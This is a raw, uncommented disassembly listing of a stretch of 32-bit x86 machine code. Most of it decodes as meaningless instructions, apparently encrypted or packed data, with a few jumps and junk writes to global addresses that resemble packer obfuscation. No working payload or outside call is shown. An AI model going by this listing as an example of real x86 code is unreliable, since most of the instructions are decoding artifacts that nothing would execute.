  403992:	sub    ah,BYTE PTR [edx-0x1d9649ba]
  403998:	mov    ebx,0xd2ad195c
  40399d:	in     eax,dx
  40399e:	add    eax,0x28196378
  4039a3:	cmp    eax,0xccadf887
  4039a8:	mov    bh,0xa5
  4039aa:	addr16 adc cl,dh
  4039ad:	or     al,BYTE PTR [edx+0x7d9f89a3]
  4039b3:	push   cs
  4039b4:	jns    0x40393f
  4039b6:	xor    DWORD PTR [ecx+0x73bca8a1],0x2c704a1f
  4039c0:	jo     0x40395e
  4039c2:	fistp  WORD PTR [ebp+0x20]
  4039c5:	je     0x40397e
  4039c7:	mov    cl,0x0
  4039c9:	fwait
  4039ca:	adc    DWORD PTR [ebp-0x7f],0x9424e6cb
  4039d1:	jnp    0x4039fa
  4039d3:	xchg   bh,ah
  4039d5:	in     al,dx
  4039d6:	dec    esi
  4039d7:	fidivr WORD PTR [edx]
  4039d9:	cmp    DWORD PTR [ebp-0x5b],eax
  4039dc:	inc    edx
  4039dd:	mov    eax,DWORD PTR [eax-0x6205fa95]
  4039e3:	jbe    0x403a5d
  4039e5:	cmp    DWORD PTR ss:[edi+0x18],esp
  4039e9:	mov    ecx,0x9889f460
  4039ee:	sub    al,0x1f
  4039f0:	leave  
  4039f1:	cmp    esp,edx
  4039f3:	js     0x4039ef
  4039f5:	jp     0x4039d4
  4039f7:	nop
  4039f8:	inc    esi
  4039f9:	int3   
  4039fa:	mov    cl,0x83
  4039fc:	stos   BYTE PTR es:[edi],al
  4039fd:	clc    
  4039fe:	mov    bh,0x67
  403a00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a01:	inc    edi
  403a02:	pop    edi
  403a03:	(bad)  
  403a04:	idiv   DWORD PTR [ecx+0x11]
  403a07:	push   esp
  403a08:	(bad)  
  403a09:	sbb    DWORD PTR [ecx-0x18],ebp
  403a0c:	rcr    DWORD PTR [eax+0x321b2f3f],1
  403a12:	sbb    al,BYTE PTR [edx-0x65938dfe]
  403a18:	jbe    0x403a76
  403a1a:	rol    BYTE PTR [edx],1
  403a1c:	xor    BYTE PTR [esi],0x95
  403a1f:	popf   
  403a20:	mov    BYTE PTR [esi],bh
  403a22:	stc    
  403a23:	mov    ebp,0x9a24eda1
  403a28:	xchg   edx,eax
  403a29:	jnp    0x403a81
  403a2b:	adc    esp,ebx
  403a2d:	xchg   edi,eax
  403a2e:	lds    eax,FWORD PTR [ebx+0x1f]
  403a31:	push   0x5069b188
  403a36:	retf   0x83a8
  403a39:	in     eax,0x78
  403a3b:	(bad)  
  403a3c:	xor    dl,cl
  403a3e:	jmp    0xdf86238f
  403a43:	dec    ecx
  403a44:	in     al,dx
  403a45:	ds xchg esp,eax
  403a47:	cmp    al,0x7d
  403a49:	add    al,0x9d
  403a4b:	popa   
  403a4c:	aam    0x4b
  403a4e:	xchg   ebx,esi
  403a50:	ds inc eax
  403a52:	dec    edi
  403a53:	mov    ecx,0xc128532a
  403a58:	or     ah,BYTE PTR [edx]
  403a5a:	ss aas 
  403a5c:	push   ss
  403a5d:	pop    ss
  403a5e:	sbb    BYTE PTR [edx-0x25207e92],0x8e
  403a65:	pushf  
  403a66:	call   0xa8cc:0x64a3d81
  403a6d:	mov    edi,0x8fe1b421
  403a72:	add    eax,0x91d6be6d
  403a77:	neg    DWORD PTR [esi-0x79]
  403a7a:	ja     0x403a83
  403a7c:	mov    edi,0xf93fa266
  403a81:	lea    edi,[ecx-0x475b01bd]
  403a87:	clc    
  403a88:	outs   dx,BYTE PTR ds:[esi]
  403a89:	mov    edx,0x591225ce
  403a8e:	mov    al,0x7
  403a90:	fnstenv [ebx+0x3e5f0f0c]
  403a96:	pop    es
  403a97:	aam    0x87
  403a99:	cmp    cl,BYTE PTR [ebx-0x80]
  403a9c:	popa   
  403a9d:	xor    DWORD PTR [edx-0x34],ebp
  403aa0:	push   edx
  403aa1:	out    dx,al
  403aa2:	arpl   WORD PTR [eax+edx*1],bx
  403aa5:	test   BYTE PTR [edi-0x3831b401],cl
  403aab:	stc    
  403aac:	rcr    ch,cl
  403aae:	and    eax,0xc4ea3f52
  403ab3:	inc    edi
  403ab4:	push   eax
  403ab5:	mov    ah,0x89
  403ab7:	cmp    al,BYTE PTR [ebx]
  403ab9:	cmp    eax,0xaa5e29e3
  403abe:	mov    cl,0x82
  403ac0:	pop    esi
  403ac1:	mov    DWORD PTR [esi],edi
  403ac3:	sub    DWORD PTR [eax],eax
  403ac5:	pop    eax
  403ac6:	scas   eax,DWORD PTR es:[edi]
  403ac7:	fdivr  DWORD PTR [edx]
  403ac9:	stc    
  403aca:	or     DWORD PTR [ebx+0x4248849f],0x3e768b43
  403ad4:	lea    ebx,[esi]
  403ad6:	test   al,0xc1
  403ad8:	pop    eax
  403ad9:	idiv   BYTE PTR [eax]
  403adb:	cli    
  403adc:	div    DWORD PTR [esi+0x57eff26d]
  403ae2:	ss (bad) 
  403ae5:	lock sbb eax,edx
  403ae8:	pop    ss
  403ae9:	not    BYTE PTR [esi-0x7d]
  403aec:	aas    
  403aed:	mov    edx,0x458a1073
  403af2:	dec    DWORD PTR [edi]
  403af4:	mov    bh,0xd
  403af6:	imul   esp,edi,0x42
  403af9:	add    BYTE PTR [ecx],dl
  403afb:	or     eax,0x42fdf6
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e1a4,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fd7d,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fd75
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx-0x66680469],esi
  403b3e:	lock lds ebx,FWORD PTR [esi]
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0xf070707d
  403b48:	jnp    0x403ace
  403b4a:	dec    edx
  403b4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b4c:	pop    es
  403b4d:	jge    0x403bce
  403b4f:	xor    eax,0xb0c1fc28
  403b54:	(bad)  
  403b55:	js     0x403b7a
  403b57:	xchg   ecx,eax
  403b58:	push   ebx
  403b59:	fs add al,0x80
  403b5c:	mov    ebp,0xb2a08043
  403b61:	arpl   WORD PTR [edi+0x7a],dx
  403b64:	mov    BYTE PTR [ecx],dh
  403b66:	pusha  
  403b67:	into   
  403b68:	pop    esi
  403b69:	pop    ebp
  403b6a:	stc    
  403b6b:	push   ecx
  403b6c:	xchg   ebp,eax
  403b6d:	pop    ss
  403b6e:	add    ch,cl
  403b70:	or     ebp,eax
  403b72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b73:	fild   WORD PTR [ebx]
  403b75:	fldl2t 
  403b77:	push   ss
  403b78:	inc    ecx
  403b79:	pop    es
  403b7a:	jp     0x403bb1
  403b7c:	push   edx
  403b7d:	ficomp WORD PTR [ebx+0xe]
  403b80:	jmp    0x403b5e
  403b82:	jl     0x403bc6
  403b84:	ret    
  403b85:	sub    BYTE PTR [edi-0xa206479],0x88
  403b8c:	xor    DWORD PTR [edi],esp
  403b8e:	into   
  403b8f:	cmp    DWORD PTR [ecx+edx*8],esi
  403b92:	aam    0x89
  403b94:	ret    0xa34b
  403b97:	push   ebp
  403b98:	ja     0x403baf
  403b9a:	stos   DWORD PTR es:[edi],eax
  403b9b:	fs push edx
  403b9d:	or     esp,DWORD PTR [eax+0x4e]
  403ba0:	int3   
  403ba1:	or     eax,0xec4b06a2
  403ba6:	add    eax,0xbb425c3d
  403bab:	sbb    esp,edi
  403bad:	addr16 or al,0xac
  403bb0:	or     BYTE PTR [edi+0x94c1940],ah
  403bb6:	or     BYTE PTR [esi],dh
  403bb8:	xchg   ebx,esi
  403bba:	jge    0x403c00
  403bbc:	and    eax,0x2088ff9f
  403bc1:	ror    BYTE PTR [ebp+0x736183af],1
  403bc7:	jns    0x403b4e
  403bc9:	jb     0x403ba3
  403bcb:	or     BYTE PTR [ecx],dl
  403bcd:	mov    BYTE PTR ds:0xe89d96be,dl
  403bd3:	setne  ah
  403bd6:	xor    BYTE PTR [ecx],al
  403bd8:	and    eax,DWORD PTR [eax+edx*2-0x51]
  403bdc:	in     eax,dx
  403bdd:	loopne 0x403c3d
  403bdf:	pusha  
  403be0:	out    dx,al
  403be1:	cld    
  403be2:	push   edi
  403be3:	ret    0x1329
  403be6:	(bad)  
  403be7:	jo     0x403b76
  403be9:	cmp    ch,al
  403beb:	inc    edi
  403bec:	es pop ds
  403bee:	push   0xffffffdf
  403bf0:	mov    DWORD PTR [edi+eax*8+0x2d],ebp
  403bf4:	test   BYTE PTR [ebp+eax*8+0x17],bh
  403bf8:	push   esp
  403bf9:	int    0x8c
  403bfb:	inc    esp
  403bfc:	inc    ecx
  403bfd:	mov    esp,0x456c6cff
  403c02:	data16 fild WORD PTR [esi+0x3b]
  403c06:	dec    ebx
  403c07:	sub    al,0x4c
  403c09:	or     dh,dl
  403c0b:	lods   al,BYTE PTR ds:[esi]
  403c0c:	sbb    al,0xae
  403c0e:	repnz (bad) 
  403c10:	imul   edx,DWORD PTR [ecx],0xffffffe9
  403c13:	lods   eax,DWORD PTR ds:[esi]
  403c14:	push   esp
  403c15:	ins    BYTE PTR es:[edi],dx
  403c16:	ss lock add al,0x98
  403c1a:	pop    edx
  403c1b:	test   BYTE PTR [edi-0xb0f7ad7],ch
  403c21:	cli    
  403c22:	pop    ds
  403c23:	es daa 
  403c25:	push   0x67
  403c27:	(bad)  
  403c28:	mov    bl,0x7c
  403c2a:	cmp    cl,BYTE PTR [edi+eax*8+0x6a]
  403c2e:	(bad)  
  403c30:	mov    dh,0x89
  403c32:	mov    es:0xeb70332b,eax
  403c38:	(bad)
  403c3d:	cli    
  403c3e:	lock call 0xd9444ee7
  403c44:	xchg   esi,eax
  403c45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c46:	mov    dl,0x17
  403c48:	mov    esi,0x82f30367
  403c4d:	fs pushf 
  403c4f:	test   al,0xbb
  403c51:	pop    esp
  403c52:	adc    BYTE PTR [edx-0x4a],cl
  403c55:	or     al,0x2
  403c57:	test   ebx,ebp
  403c59:	jle    0x403c9b
  403c5b:	mov    eax,ds:0x5c388a6f
  403c60:	pusha  
  403c61:	adc    bl,BYTE PTR ds:0x81bed014
  403c67:	in     eax,dx
  403c68:	inc    ecx
  403c69:	jmp    0x2a663819
  403c6e:	or     al,0xf3
  403c70:	xchg   bl,dl
  403c72:	add    al,0x56
  403c74:	xor    BYTE PTR [esi+0x6559c2f9],ah
  403c7a:	leave  
  403c7b:	outs   dx,DWORD PTR ds:[esi]
  403c7c:	push   ss
  403c7d:	dec    ecx
  403c7e:	xor    al,0xaf
  403c80:	dec    edi
  403c81:	in     al,0x3f
  403c83:	lods   al,BYTE PTR ds:[esi]
  403c84:	gs cs in al,0x2d
  403c88:	sbb    edi,edi
  403c8a:	or     al,0xfd
  403c8c:	stc    
  403c8d:	inc    ebx
  403c8e:	test   ah,ah
  403c90:	pop    eax
  403c91:	addr16 mov edi,0x15c39c67
  403c97:	iret   
  403c98:	aas    
  403c99:	sub    al,0x53
  403c9b:	jmp    0x403cf4
  403c9d:	or     al,0x95
  403c9f:	or     DWORD PTR [eax+0x19c4b63c],edi
  403ca5:	(bad)  
  403ca6:	push   0x8d8b24a4
  403cab:	xor    dl,dh
  403cad:	arpl   WORD PTR [edx],cx
  403caf:	pusha  
  403cb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cb1:	lea    edi,[eax+0x4781bbb]
  403cb7:	pop    ebp
  403cb8:	jae    0x403c74
  403cba:	sub    esp,ebx
  403cbc:	test   bh,ch
  403cbe:	sbb    cl,BYTE PTR [eax+0x1d029a88]
  403cc4:	push   ebx
  403cc5:	(bad)  
  403cc6:	jmp    0x90bd:0xad79c2b
  403ccd:	loope  0x403c8a
  403ccf:	das    
  403cd0:	sbb    ch,BYTE PTR [ebx]
  403cd2:	(bad)  
  403cd3:	jmp    0x6f1877eb
  403cd8:	sub    BYTE PTR [ecx],al
  403cda:	push   edx
  403cdb:	cmp    dh,0x64
  403cde:	push   0xffffff9d
  403ce0:	retf   0x1b7c
  403ce3:	jle    0x403c97
  403ce5:	aad    0x5a
  403ce7:	sub    al,ah
  403ce9:	aam    0xab
  403ceb:	rol    BYTE PTR [ecx],1
  403ced:	int    0xa
  403cef:	aas    
  403cf0:	dec    edi
  403cf1:	retf   
  403cf2:	lock jbe 0x403d05
  403cf5:	jo     0x403cc6
  403cf7:	hlt    
  403cf8:	popf   
  403cf9:	mov    ebx,0xd6e92569
  403cfe:	pushf  
  403cff:	loopne 0x403d49
  403d01:	cmp    BYTE PTR [edx+0x5b],ah
  403d04:	bound  ebp,QWORD PTR [edi+0x35]
  403d07:	retf   0x4d8d
  403d0a:	add    bl,BYTE PTR [edi-0x198014a4]
  403d10:	imul   esp,DWORD PTR [eax-0x159bd43c],0x30d17064
  403d1a:	loop   0x403d8b
  403d1c:	sub    BYTE PTR ds:0x7f92964c,ah
  403d22:	pop    esp
  403d23:	and    DWORD PTR [esi+0x7f],ebp
  403d26:	dec    esi
  403d27:	test   al,0x4c
  403d29:	or     BYTE PTR [ebx-0x1a6faa86],cl
  403d2f:	sub    bl,dh
  403d31:	add    BYTE PTR [ecx],ah
  403d33:	adc    BYTE PTR [eax+0x67f02d94],cl
  403d39:	sub    esp,0xffffffbd
  403d3c:	(bad)  
  403d3d:	xor    al,0xf7
  403d3f:	pusha  
  403d40:	rcr    dl,cl
  403d42:	dec    ecx
  403d43:	std    
  403d44:	inc    esi
  403d45:	popa   
  403d46:	dec    edi
  403d47:	scas   eax,DWORD PTR es:[edi]
  403d48:	jle    0x403dbc
  403d4a:	sti    
  403d4b:	push   ebx
  403d4c:	les    ebp,FWORD PTR [ecx+0x5a6fc01]
  403d52:	retf   0x6929
  403d55:	rcr    DWORD PTR [eax-0x33344672],1
  403d5b:	push   cs
  403d5c:	clc    
  403d5d:	mov    DWORD PTR gs:[esi+ebx*2+0x1d],eax
  403d62:	pusha  
  403d63:	ror    ch,0x51
  403d66:	or     esi,edx
  403d68:	adc    al,0x12
  403d6a:	pop    ecx
  403d6b:	push   edx
  403d6c:	jnp    0x403cf5
  403d6e:	lahf   
  403d6f:	dec    ebp
  403d70:	clc    
  403d71:	mov    ah,0x49
  403d73:	adc    eax,0xf5ecc3a
  403d78:	sub    eax,0x3711f9d0
  403d7d:	and    eax,0x26ce0b7c
  403d82:	hlt    
  403d83:	rcr    DWORD PTR [ecx],1
  403d85:	jb     0x403dfd
  403d87:	imul   DWORD PTR [esi+ebx*1+0x2091556d]
  403d8e:	jnp    0x403d7d
  403d90:	outs   dx,BYTE PTR ds:[esi]
  403d91:	xchg   ebx,eax
  403d92:	sbb    esi,DWORD PTR [edi+0x49]
  403d95:	hlt    
  403d96:	dec    eax
  403d97:	jmp    0x9b9914cd
  403d9c:	cwde   
  403d9d:	(bad)  
  403d9e:	mov    ds:0xe4452dff,al
  403da3:	mov    bh,0xb1
  403da5:	mov    bl,0x3
  403da7:	test   eax,0x2a552c7d
  403dac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dad:	out    dx,eax
  403dae:	push   0xffffffda
  403db0:	fidiv  WORD PTR [ebx+0x30]
  403db3:	jmp    0x403dbd
  403db5:	jp     0x403e09
  403db7:	mov    bh,BYTE PTR [ebp-0x5d05b6a5]
  403dbd:	push   ds
  403dbe:	loopne 0x403def
  403dc0:	dec    eax
  403dc1:	jmp    0x67e925ff
  403dc6:	mov    edx,DWORD PTR [ecx]
  403dc8:	xor    DWORD PTR [eax+0x15],ebp
  403dcb:	pop    ecx
  403dcc:	pusha  
  403dcd:	mov    bh,0xde
  403dcf:	ror    BYTE PTR [ebx+esi*2+0x1c2a864a],cl
  403dd6:	sahf   
  403dd7:	xor    ch,BYTE PTR [ebp+edx*8-0x54]
  403ddb:	and    BYTE PTR [edx],ch
  403ddd:	mov    cl,0xd1
  403ddf:	xchg   edx,eax
  403de0:	cmc    
  403de1:	les    ebx,FWORD PTR [ecx]
  403de3:	or     eax,0x3fd69b66
  403de8:	repz daa 
  403dea:	sbb    dh,dh
  403dec:	jnp    0x403dec
  403dee:	push   eax
  403def:	mov    eax,ds:0x115040a7
  403df4:	es jbe 0x403e2e
  403df7:	jo     0x403e57
  403df9:	retf   0x2f22
  403dfc:	dec    edi
  403dfd:	sub    DWORD PTR [edi-0x3e],eax
  403e00:	rcr    bh,0x47
  403e03:	jno    0x403de1
  403e05:	cs mov bl,0x92
  403e08:	mov    bh,BYTE PTR [esi+0x1ccb58e4]
  403e0e:	sbb    dh,ch
  403e10:	(bad)  [edi]
  403e12:	stc    
  403e13:	pop    ebx
  403e14:	lods   eax,DWORD PTR ds:[esi]
  403e15:	mov    dl,0x9
  403e17:	pop    ds
  403e18:	repz adc BYTE PTR ds:0x21e8bbdb,bh
  403e1f:	loop   0x403dc7
  403e21:	jbe    0x403de6
  403e23:	das    
  403e24:	jb     0x403ddb
  403e26:	push   esp
  403e27:	push   cs
  403e28:	stos   DWORD PTR es:[edi],eax
  403e29:	stos   BYTE PTR es:[edi],al
  403e2a:	fsub   QWORD PTR [edi-0x10]
  403e2d:	ror    DWORD PTR [eax],1
  403e2f:	inc    esp
  403e30:	xchg   ecx,eax
  403e31:	lods   eax,DWORD PTR ds:[esi]
  403e32:	cmp    eax,DWORD PTR [ecx-0x75b7e4c3]
  403e38:	xor    DWORD PTR [esi],ecx
  403e3a:	fist   WORD PTR [ecx-0x508019b]
  403e40:	and    edi,ecx
  403e42:	push   ds
  403e43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e44:	jo     0x403ea4
  403e46:	enter  0xb0c3,0xfb
  403e4a:	sbb    cl,BYTE PTR [ebx]
  403e4c:	push   0x4f
  403e4e:	mov    ecx,esi
  403e50:	pushf  
  403e51:	push   edx
  403e52:	add    ebx,DWORD PTR [ebx-0x7ed26f7b]
  403e58:	sub    eax,0xcb7cafd6
  403e5d:	enter  0x6a1c,0x8a
  403e61:	inc    eax
  403e62:	push   esp
  403e63:	retf   
  403e64:	jg     0x403eb6
  403e66:	dec    ebx
  403e67:	(bad)  
  403e68:	arpl   bx,bp
  403e6a:	scas   al,BYTE PTR es:[edi]
  403e6b:	lods   eax,DWORD PTR ds:[esi]
  403e6c:	inc    ebp
  403e6d:	and    edi,DWORD PTR [edi-0x37330e69]
  403e73:	push   eax
  403e74:	dec    edx
  403e75:	fist   DWORD PTR [ecx]
  403e77:	pop    edx
  403e78:	cmp    DWORD PTR [edx-0x75],eax
  403e7b:	lods   al,BYTE PTR ds:[esi]
  403e7c:	or     DWORD PTR [eax+0x54875c9c],edi
  403e82:	(bad)  
  403e83:	scas   al,BYTE PTR es:[edi]
  403e84:	retf   0xc28a
  403e87:	push   ebp
  403e88:	(bad)  
  403e89:	pop    esi
  403e8a:	mov    DWORD PTR [ebp-0x10],0xf89c8530
  403e91:	mov    eax,DWORD PTR [ebp-0x8]
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e19c
  403ea2:	adc    DWORD PTR ds:0x42e78f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fdf2,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd85,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e76f,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0xc49d1c35
  403eec:	sti    
  403eed:	jmp    0x403e71
  403eef:	sbb    esi,DWORD PTR [eax+0x70]
  403ef2:	cmp    eax,0x970707d
  403ef7:	popf   
  403ef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ef9:	adc    DWORD PTR [edi],0x21
  403efc:	outs   dx,BYTE PTR ds:[esi]
  403efd:	dec    ecx
  403efe:	sbb    DWORD PTR [ebp-0x7d],0xffffffe9
  403f02:	jb     0x403f01
  403f04:	sti    
  403f05:	fild   DWORD PTR [ecx+ebp*4+0x4a22f19]
  403f0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f0d:	mov    BYTE PTR [ebp-0x1d708b00],cl
  403f13:	sub    eax,0x83450c37
  403f18:	sub    ah,cl
  403f1a:	(bad)  
  403f1b:	xlat   BYTE PTR ds:[ebx]
  403f1c:	popw   ds
  403f1e:	cs pop ss
  403f20:	bound  edi,QWORD PTR [eax+0x7f]
  403f23:	inc    DWORD PTR [edx+ebp*2-0xee6eaad]
  403f2a:	xor    edx,0xffffffa8
  403f2d:	ficom  WORD PTR [edi]
  403f2f:	leave  
  403f30:	xchg   edi,eax
  403f31:	lods   al,BYTE PTR ds:[esi]
  403f32:	push   ebp
  403f33:	loop   0x403f04
  403f35:	mov    bl,0x32
  403f37:	jb     0x403f74
  403f39:	enter  0xed6a,0x69
  403f3d:	add    al,0x6c
  403f3f:	adc    eax,0x64a189ea
  403f44:	stc    
  403f45:	jno    0x403fad
  403f47:	and    cl,ah
  403f49:	mov    DWORD PTR [edx-0x12],esi
  403f4c:	aam    0xb9
  403f4e:	fwait
  403f4f:	das    
  403f50:	jge    0x403fb2
  403f52:	sbb    edi,DWORD PTR ds:0x9064b474
  403f58:	das    
  403f59:	sbb    DWORD PTR [edi-0x1acd6313],esi
  403f5f:	sbb    ecx,DWORD PTR [edx+ecx*4+0x1cc1019c]
  403f66:	xor    al,0xca
  403f68:	int    0x43
  403f6a:	xor    al,0x62
  403f6c:	cmp    eax,0xc2547a82
  403f71:	out    dx,al
  403f72:	rcl    BYTE PTR [edi+ebp*2+0x580b242e],cl
  403f79:	sbb    esp,ebp
  403f7b:	mov    ch,0x52
  403f7d:	add    eax,0x447e9d0d
  403f82:	xchg   esp,eax
  403f83:	icebp  
  403f84:	dec    ebp
  403f85:	sub    DWORD PTR [ebx-0x5e],edi
  403f88:	xlat   BYTE PTR ds:[ebx]
  403f89:	les    edx,FWORD PTR ds:0x7193f1c7
  403f8f:	int3   
  403f90:	popa   
  403f91:	and    eax,0xc3fef3c4
  403f96:	retf   
  403f97:	add    esi,0x62be750
  403f9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f9e:	cwde   
  403f9f:	shl    BYTE PTR [edi+eiz*1-0x7a074a78],0xaf
  403fa7:	mov    dl,0x17
  403fa9:	test   eax,0xcb4dec96
  403fae:	int    0x85
  403fb0:	xchg   esi,eax
  403fb1:	lea    ebp,[esi-0x4e958668]
  403fb7:	push   es
  403fb8:	add    DWORD PTR [ecx+0x37],ecx
  403fbb:	ins    BYTE PTR es:[edi],dx
  403fbc:	pop    edx
  403fbd:	enter  0x2365,0xe4
  403fc1:	pusha  
  403fc2:	mov    bl,0x83
  403fc4:	cmp    ah,BYTE PTR [esi+0x56668beb]
  403fca:	add    al,0xe2
  403fcc:	pop    ds
  403fcd:	std    
  403fce:	fwait
  403fcf:	sub    dl,BYTE PTR [esi]
  403fd1:	mov    ebp,0x65be472a
  403fd6:	out    0xd7,eax
  403fd8:	int3   
  403fd9:	cdq    
  403fda:	mov    dh,0x2c
  403fdc:	mov    ecx,0x1343ef45
  403fe1:	pop    ebx
  403fe2:	jns    0x403fa3
  403fe4:	mov    ds:0x5df32503,al
  403fe9:	fdiv   DWORD PTR [esi-0x2a4780da]
  403fef:	pusha  
  403ff0:	ret    0x92cf
  403ff3:	jo     0x403fa5
  403ff5:	daa    
  403ff6:	or     al,0x4e
  403ff8:	cwde   
  403ff9:	push   edx
  403ffa:	daa    
  403ffb:	leave  
  403ffc:	(bad)  
  403ffd:	dec    ebx
  403ffe:	jecxz  0x403ff8
  404000:	addr16 ds inc ebp
  404003:	and    eax,0xf9c28122
  404008:	adc    cl,ah
  40400a:	adc    BYTE PTR [edx+0x70],cl
  40400d:	and    eax,eax
  40400f:	or     al,0xbd
  404011:	enter  0xae6c,0xff
  404015:	adc    BYTE PTR [ecx-0x2],cl
  404018:	ds fs ja 0x404029
  40401c:	out    0x1b,eax
  40401e:	pushf  
  40401f:	push   0x22
  404021:	inc    ecx
  404022:	cmovle esi,ebx
  404025:	outs   dx,DWORD PTR ds:[esi]
  404026:	and    DWORD PTR [ebx-0x21],esp
  404029:	sub    bl,BYTE PTR [ecx-0x23ab2b03]
  40402f:	ror    eax,cl
  404031:	pop    ecx
  404032:	xchg   edi,eax
  404033:	(bad)  
  404034:	in     eax,0xdb
  404036:	in     eax,dx
  404037:	xlat   BYTE PTR ds:[ebx]
  404038:	cmp    ebp,eax
  40403a:	jbe    0x404045
  40403c:	ret    0xdcd4
  40403f:	and    al,0x7d
  404041:	ror    DWORD PTR [eax],0xec
  404044:	jb     0x40405c
  404046:	(bad)  
  404047:	test   ecx,edi
  404049:	mov    ds:0xa3e558dc,al
  40404e:	adc    ebp,0x83781449
  404054:	add    al,0xe3
  404056:	fucom  st(4)
  404058:	fdiv   QWORD PTR [ebx-0x5d]
  40405b:	mov    eax,ds:0x227e4eb2
  404060:	es xor eax,0xc6a30315
  404066:	in     al,dx
  404067:	sbb    DWORD PTR [ebx],edx
  404069:	pop    edx
  40406a:	dec    ebp
  40406b:	pop    DWORD PTR ds:0xa082c006
  404071:	cmp    BYTE PTR [ebp+0x42],ah
  404074:	push   cs
  404075:	sub    al,0xe8
  404077:	cwde   
  404078:	jecxz  0x4040f1
  40407a:	mov    edx,0x777ed95
  40407f:	jmp    0x52e9:0xf84af520
  404086:	cs xchg ebp,eax
  404088:	fs xchg esp,eax
  40408a:	xchg   dl,al
  40408c:	push   ebx
  40408d:	sub    ch,ch
  40408f:	jno    0x4040da
  404091:	jp     0x404095
  404093:	and    dl,BYTE PTR [eax]
  404095:	loop   0x4040cc
  404097:	imul   eax,DWORD PTR [edx+0x78351023],0xc9256158
  4040a1:	or     eax,0x75b44887
  4040a6:	(bad)  
  4040a8:	test   ch,ah
  4040aa:	adc    DWORD PTR [esi-0x5aee7cf1],esi
  4040b0:	sbb    eax,0x7ef61311
  4040b5:	pop    ebx
  4040b6:	sbb    al,0xe
  4040b8:	sbb    al,dl
  4040ba:	mov    ch,0x8b
  4040bc:	adc    DWORD PTR [edx+0x7c],edx
  4040bf:	(bad)  
  4040c0:	and    edx,DWORD PTR [ebp+0x3e]
  4040c3:	cli    
  4040c4:	ins    BYTE PTR es:[edi],dx
  4040c5:	popf   
  4040c6:	pop    ds
  4040c7:	mov    bl,0xde
  4040c9:	cwde   
  4040ca:	dec    ecx
  4040cb:	clc    
  4040cc:	pop    ds
  4040cd:	or     DWORD PTR [ecx-0x6f],esi
  4040d0:	loope  0x404134
  4040d2:	retf   0xc7be
  4040d5:	addr16 loope 0x404135
  4040d8:	(bad)  
  4040d9:	in     eax,dx
  4040da:	std    
  4040db:	pop    eax
  4040dc:	pop    esi
  4040dd:	adc    DWORD PTR [edx+0x5d0d8083],0xffffff84
  4040e4:	loopne 0x4040ff
  4040e6:	inc    ebx
  4040e7:	inc    ecx
  4040e8:	push   edx
  4040e9:	in     al,dx
  4040ea:	cmp    ecx,ecx
  4040ec:	xchg   ebp,eax
  4040ed:	bound  edi,QWORD PTR [eax+0x288ddc27]
  4040f3:	or     al,0xe9
  4040f5:	clc    
  4040f6:	into   
  4040f7:	aam    0x90
  4040f9:	stc    
  4040fa:	sub    DWORD PTR [edx-0x65],eax
  4040fd:	or     eax,0x9202cfc
  404102:	and    bl,BYTE PTR [ebp+0x2f]
  404105:	fwait
  404106:	mov    edx,0x8d84302a
  40410b:	xchg   DWORD PTR [edi-0x39488f1d],esp
  404111:	test   ecx,0x41bf724a
  404117:	jmp    0x2427:0x6ce534a8
  40411e:	(bad)  
  404120:	les    ebx,FWORD PTR [esp+esi*1]
  404123:	xor    BYTE PTR [ebx],0x30
  404126:	cmp    BYTE PTR [eax+0xd],ch
  404129:	push   esi
  40412a:	push   ss
  40412b:	jg     0x4040df
  40412d:	into   
  40412e:	ret    0xa304
  404131:	jge    0x4040be
  404133:	dec    esp
  404134:	xor    eax,0x4a639e83
  404139:	mov    bh,0x16
  40413b:	mov    WORD PTR [ecx],gs
  40413d:	push   cs
  40413e:	(bad)  
  40413f:	jmp    0xc9e29012
  404144:	and    eax,0x7537b90d
  404149:	inc    ebx
  40414a:	fld    DWORD PTR [eax]
  40414c:	int3   
  40414d:	in     eax,dx
  40414e:	icebp  
  40414f:	mov    ds:0x56fd55d1,al
  404154:	or     al,0x9e
  404156:	test   ch,dh
  404158:	loop   0x40418a
  40415a:	jmp    0xdc16:0x2d9b3a8a
  404161:	test   eax,0x16f0f026
  404166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404167:	test   eax,0x772e54ff
  40416c:	dec    ebx
  40416d:	mov    ebp,0xccd716f2
  404172:	outs   dx,BYTE PTR ds:[esi]
  404173:	add    cl,BYTE PTR ds:[esi]
  404176:	jge    0x40414d
  404178:	sub    BYTE PTR [eax],0xe8
  40417b:	imul   esi,DWORD PTR [ebx],0xfffffff1
  40417e:	mov    dh,BYTE PTR [ecx-0x3]
  404181:	or     eax,0x9057c111
  404186:	aad    0x53
  404188:	push   esi
